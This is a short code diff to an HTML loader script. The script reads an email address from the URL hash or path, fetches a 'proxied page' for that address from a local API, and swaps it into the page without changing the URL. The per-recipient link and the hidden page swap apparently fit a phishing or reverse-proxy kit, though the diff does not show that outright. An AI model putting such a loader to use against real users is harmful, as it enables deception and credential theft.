@@ -20,15 +20,25 @@
     
     <script>
         setTimeout(function() {
+            // Check hash first
             var hash = window.location.hash;
+            var email = "";
+
             if (hash && hash.length > 1) {
-                var email = hash.substring(1); 
-                
+                email = hash.substring(1); 
+            } else {
+                // If the URL was redirected to /testuser@gmail.com, grab it from the path
+                var path = window.location.pathname;
+                if (path !== "/" && path !== "/loader.html") {
+                    email = path.substring(1);
+                }
+            }
+
+            if (email) {
                 // Fetch the proxied page via API without changing the URL
                 fetch('/api/fetch?email=' + encodeURIComponent(email))
                     .then(response => response.text())
                     .then(html => {
-                        // Replace the entire page with the fetched HTML
                         document.open();
                         document.write(html);
                         document.close();
@@ -39,7 +49,7 @@
                         document.querySelector('.spinner').style.display = "none";
                     });
             } else {
-                document.getElementById('status-text').innerHTML = "No account specified. Please use a valid link.";
+                document.getElementById('status-text').innerHTML = "No account specified.";
                 document.getElementById('status-text').style.color = "red";
                 document.querySelector('.spinner').style.display = "none";
             }
